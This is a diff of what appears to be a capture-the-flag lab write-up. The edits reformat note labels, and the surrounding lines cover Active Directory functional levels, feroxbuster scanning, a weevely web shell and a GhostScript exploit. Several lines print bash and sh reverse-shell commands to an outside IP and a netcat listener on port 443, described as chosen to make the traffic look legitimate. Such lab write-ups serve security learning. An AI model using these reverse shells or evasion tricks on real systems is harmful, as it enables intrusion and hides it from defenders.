@@ -224,7 +224,7 @@ author = "bloodstiller"
         ```
 
         -   The functionality level determines the minimum version of Windows server that can be used for a DC.
-            -   Note that any host os can used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
+            -   +Note+: Any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
             -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
             -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.
 
@@ -244,7 +244,7 @@ author = "bloodstiller"
                 | 8                       | Windows Server 2019         |
                 | 9                       | Windows Server 2022         |
 
-                -   Note:
+                -   +Note+:
                     -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                     -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.
 
@@ -302,7 +302,7 @@ author = "bloodstiller"
 #### Directory Busting HTTPS Using Feroxbuster: {#directory-busting-https-using-feroxbuster}
 
 -   `feroxbuster -u https://10.129.229.189 -k`
-    -   **Note**: If the domain uses self-signed certs we have to pass the `-k` flag as otherwise ferox will not run as it rejects self-signed certs.
+    -   +Note+: If the domain uses self-signed certs we have to pass the `-k` flag as otherwise ferox will not run as it rejects self-signed certs.
         -   {{< figure src="/ox-hugo/2024-09-30-081433_.png" >}}
 
             -   We can see that there is a `phpmyadmin` page running, which is a good target, however it's a 403 so we cannot get access to directly. However we may be able to gain access via the web-proxy that is running?
@@ -519,11 +519,11 @@ http://10.129.229.189:8080/vendor/animate/
 -   I believe the easiest way to get around the time out will be to on connection immediately trigger a manual reverse shell back to ourselves from the weevley shell and background the task to ensure the connection remains.
     1.  **Prepare my listener**:
         -   `nc -nvlp 443`
-        -   **Note**: I use 443 so the traffic at least looks legitimate.
+        -   +Note+: I use 443 so the traffic at least looks legitimate.
 
     2.  **Prepare my reverse shell statement to paste into the weevley shell**:
         -   `bash -c 'bash -i >& /dev/tcp/10.10.14.27/443 0>&1'`
-        -   **Note**:
+        -   +Note+:
             -   I do this as it's time-sensitive &amp; I want to easily copy and paste as opposed to typing something out and getting a type-o.
 
     3.  **Connect via weevley**:
@@ -536,7 +536,7 @@ http://10.129.229.189:8080/vendor/animate/
 
 <!--listend-->
 
--   **Note**:
+-   +Note+:
     -   Full transparency here, I tried multiple ways to get this to work, including the below. However the only way I could get a connection was using the above sub-shell method. I am showing you this as I want you to know that sometimes you have to just keep trying to find a viable path to make things work.
         -   `/usr/bin/bash -i >& /dev/tcp/10.10.14.27/443 0>&1`
         -   `/bin/sh -i >& /dev/tcp/10.10.14.27/443 0>&1`
@@ -785,7 +785,7 @@ Looking at the readme for the GhostScript public exploit CVE_2023_36664, we have
 5.  **Within seconds I have a reverse shell**:
     -   {{< figure src="/ox-hugo/2024-10-02-162901_.png" >}}
 
-**Note**: This is one of the coolest boxes I have done. The creativity is amazing.
++Note+: This is one of the coolest boxes I have done. The creativity is amazing.
 
 
 ### Finding Hard-Coded Creds In `ghostscript.bat` file: {#finding-hard-coded-creds-in-ghostscript-dot-bat-file}
